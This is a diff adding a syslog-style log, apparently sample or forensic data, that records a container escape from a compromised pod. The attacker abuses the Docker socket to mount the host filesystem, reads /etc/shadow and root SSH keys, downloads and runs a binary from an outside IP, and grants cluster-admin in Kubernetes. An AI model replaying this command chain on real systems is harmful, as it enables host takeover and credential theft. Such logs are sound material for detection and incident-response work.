@@ -1,0 +1,22 @@
+Jul 28 13:00:00 orchestrator kubelet[10050]: Error: container "app-74f8d6b9c7-4k2m1" in pod "webapp-nginx" failed with OOMKilled
+Jul 28 13:00:05 orchestrator dockerd[10055]: Container c1a2b3c4d5e6: exec command "/bin/bash -c 'cat /proc/1/cgroup'" returned exit code 0
+Jul 28 13:00:10 orchestrator dockerd[10056]: Container c1a2b3c4d5e6: exec command "/bin/bash -c 'mount | grep docker'" returned exit code 0
+Jul 28 13:00:15 orchestrator dockerd[10057]: Container c1a2b3c4d5e6: exec command "/bin/bash -c 'ls -la /var/run/docker.sock'" returned exit code 0
+Jul 28 13:00:20 orchestrator dockerd[10058]: Container c1a2b3c4d5e6: exec command "/bin/bash -c 'cat /proc/1/environ | tr \"\\0\" \"\\n\"'" returned exit code 0
+Jul 28 13:00:30 orchestrator dockerd[10060]: Container c1a2b3c4d5e6: exec command "/bin/bash -c 'capsh --print'" returned exit code 0
+Jul 28 13:00:45 orchestrator kernel: audit: type=1400 audit(1722150045.123:4567): apparmor="DENIED" operation="open" profile="docker-default" pid=12345 comm="bash" requested_mask="r" denied_mask="r" fsuid=0 ouid=0 name="/etc/docker/daemon.json"
+Jul 28 13:01:00 orchestrator dockerd[10065]: Container c1a2b3c4d5e6: exec command "/bin/bash -c 'curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json'" returned exit code 0
+Jul 28 13:01:15 orchestrator dockerd[10070]: Container c1a2b3c4d5e6: exec command "/bin/bash -c 'curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create?name=escape -H \"Content-Type: application/json\" -d \"{\\\"Image\\\":\\\"ubuntu\\\",\\\"Cmd\\\":[\\\"/bin/bash\\\"],\\\"Binds\\\":[\\\"/:/host\\\"]}\"'" returned exit code 0
+Jul 28 13:01:30 orchestrator dockerd[10075]: Container c1a2b3c4d5e6: exec command "/bin/bash -c 'curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/escape/start'" returned exit code 0
+Jul 28 13:01:45 orchestrator dockerd[10080]: Container escape: exec command "/bin/bash -c 'chroot /host bash'" returned exit code 0
+Jul 28 13:02:00 orchestrator dockerd[10085]: Container escape: exec command "/bin/bash -c 'cat /host/etc/shadow'" returned exit code 0
+Jul 28 13:02:15 orchestrator dockerd[10090]: Container escape: exec command "/bin/bash -c 'ssh -i /host/root/.ssh/id_rsa root@10.0.0.50'" returned exit code 0
+Jul 28 13:02:30 orchestrator dockerd[10095]: Container escape: exec command "/bin/bash -c 'wget http://185.220.106.20:8000/kube_pwn && chmod +x kube_pwn && ./kube_pwn'" returned exit code 0
+Jul 28 13:03:00 orchestrator auditd[10100]: SYSCALL arch=c000003e syscall=59 success=yes exit=0 a0=55d4a1b2c380 a1=55d4a1b2c450 a2=55d4a1b2c520 a3=0 items=2 ppid=10095 pid=10101 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=4294967295 comm="kube_pwn" exe="kube_pwn"
+Jul 28 13:03:30 orchestrator sshd[10110]: Failed password for root from 10.0.0.50 port 58001 ssh2
+Jul 28 13:03:32 orchestrator sshd[10111]: Failed password for root from 10.0.0.50 port 58002 ssh2
+Jul 28 13:03:34 orchestrator sshd[10112]: Accepted publickey for root from 10.0.0.50 port 58003 ssh2
+Jul 28 13:03:35 orchestrator sshd[10112]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Jul 28 13:04:00 orchestrator sudo[10115]:   root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/kubectl get secrets --all-namespaces
+Jul 28 13:04:15 orchestrator sudo[10120]:   root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/kubectl get pods --all-namespaces -o wide
+Jul 28 13:04:30 orchestrator sudo[10125]:   root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/kubectl create clusterrolebinding pwn-cluster-admin --clusterrole=cluster-admin --serviceaccount=default:default
